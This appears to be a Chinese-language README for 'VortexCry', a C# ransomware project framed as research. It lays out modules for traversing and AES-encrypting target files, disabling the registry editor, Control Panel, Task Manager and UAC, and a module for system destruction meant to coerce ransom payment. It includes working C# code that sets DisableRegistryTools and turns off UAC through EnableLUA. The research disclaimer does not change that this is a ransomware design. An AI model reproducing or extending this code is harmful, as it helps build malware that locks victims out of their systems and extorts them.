# VortexCry 勒索软件研究项目 
 
## 项目简介 
本项目旨在通过使用 C# 编写勒索软件 VortexCry，深入研究勒索软件的工作原理，为网络安全防护提供更具针对性的思路。请注意，本项目仅用于技术研究和学习，严禁将相关代码用于任何非法活动。 
 
## 技术准备 
### 编程语言基础 
- C# 语法规则：全面复习 C# 语言的语法规则，包括变量声明、数据类型转换、流程控制语句（如 if - else、for、while 循环）等，为编写复杂功能模块打下基础。 
- 面向对象编程（OOP）：深入学习 C# 面向对象编程特性，如类、对象、继承、多态、封装等，以类的形式组织文件操作、加密解密、用户交互以及系统操作等功能模块，提高代码的可维护性。 
 
### 核心技术知识储备 
- 文件操作：掌握文件遍历和处理的方法，用于定位和加密目标文件。 
- 加密算法：了解 AES 等加密算法，实现文件的加密和解密。 
- 系统操作：熟悉 Windows 注册表操作和系统底层操作，如禁用注册表编辑器、控制面板、任务管理器，关闭用户账户控制（UAC）等。 
 
## 项目结构 
文件遍历模块 
用于遍历和处理文件，定位需要加密的目标文件。提供接口定义和具体的类实现，展示如何通过 C# 代码实现文件遍历功能。 
 
### 注册表配置模块 
用于修改注册表以限制用户操作，包括禁用注册表编辑器、控制面板、任务管理器，关闭用户账户控制（UAC），启用或禁用 Windows 功能限制，配置命令提示符（CMD）的状态等。 
 
### 系统操作模块 
执行更底层的系统破坏操作，增强勒索软件的破坏性和威胁性，胁迫用户尽快支付赎金。 
 
## 代码示例 
以下是部分关键代码示例： 
```csharp 
// 禁用注册表编辑器 
public void DisableRegistryEdit() 
{ 
    // 在 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System 路径下创建或修改 DisableRegistryTools 值 
    RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true); 
    if (key == null) 
    { 
        key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"); 
    } 
    key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord); 
    key.Close(); 
} 
 
// 关闭用户账户控制（UAC） 
public void DisableUAC() 
{ 
    // 在 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System 路径下创建或修改 EnableLUA 值为 0 
    RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true); 
    if (key == null) 
    { 
        key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); 
    } 
    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord); 
    key.Close(); 
} 
``` 
 
## 免责声明 
本项目仅作技术探讨与研究用途，严禁将相关代码用于任何非法活动，否则后果自负。 
 
## 贡献 
如果你对本项目有任何建议或改进意见，欢迎提交 Pull Request 或 Issue。 
